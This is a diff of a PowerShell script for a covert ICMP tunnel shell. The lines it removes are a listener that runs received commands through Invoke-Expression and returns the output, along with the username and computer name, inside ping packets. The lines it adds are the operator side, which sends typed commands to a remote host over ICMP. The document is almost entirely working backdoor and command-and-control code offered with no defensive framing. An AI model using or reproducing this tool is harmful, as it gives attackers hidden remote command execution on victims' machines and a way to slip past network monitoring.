@@ -3,7 +3,6 @@ $F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.
 [char]$EL = 10
 
 
-
 #send
 
   $sc = [System.Net.NetworkInformation.Ping]::new()
@@ -13,43 +12,25 @@ $F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.
 
 #recieve
 
-  $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[0])
+  $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[1])
+  $SendingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[0])
   $pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
   $pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
   $pRs.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
   $buffer = New-Object byte[] $pRs.ReceiveBufferSize
   $pRs.ReceiveTimeout = 0
 
-
+  
+$sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes("NewHost" + $EL)), $PingOptions) | Out-Null
+$sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes($BindingIP + $EL)), $PingOptions) | Out-Null
+$pRs.Receive($buffer);(([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
+$pRs.Receive($buffer)
 
 While ($true) {
+  Write-Host -NoNewline (([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
+  $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes("Com" + $EL)), $PingOptions) | Out-Null
+  $inp = $Host.UI.ReadLine();
+  $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes($inp + $EL)), $PingOptions) | Out-Null
+  $pRs.Receive($buffer);(([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
   $pRs.Receive($buffer)
-  $raw = [System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize])
-  $Received = (([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
-  if ($raw.Contains($EL)) {
-    if ($Received -eq "NewHost") {
-      $pRs.Receive($buffer)
-      $SendingIP = (([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
-      $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n" + $EL)), $PingOptions)
-      $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes('PS ' + (Get-Location).Path + '> ' + $EL)), $PingOptions)
-    }
-    if ($Received -eq "Com") {
-      $com = $null
-      $pRs.Receive($buffer)
-      $Received = (([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
-      if ([string]::IsNullOrEmpty($Received) -or [string]::IsNullOrWhiteSpace($Received)) {
-          $com = "No Command Received."
-      }
-      else {
-          $com = Invoke-Expression -Command $Received
-          $com += "`n" + ($error[0])
-      }
-
-      $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes([string]$com + $EL)), $PingOptions)
-      $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes('PS ' + (Get-Location).Path + '> ' + $EL)), $PingOptions)
-      $error.clear()
-    }
-  }
 }
-
-
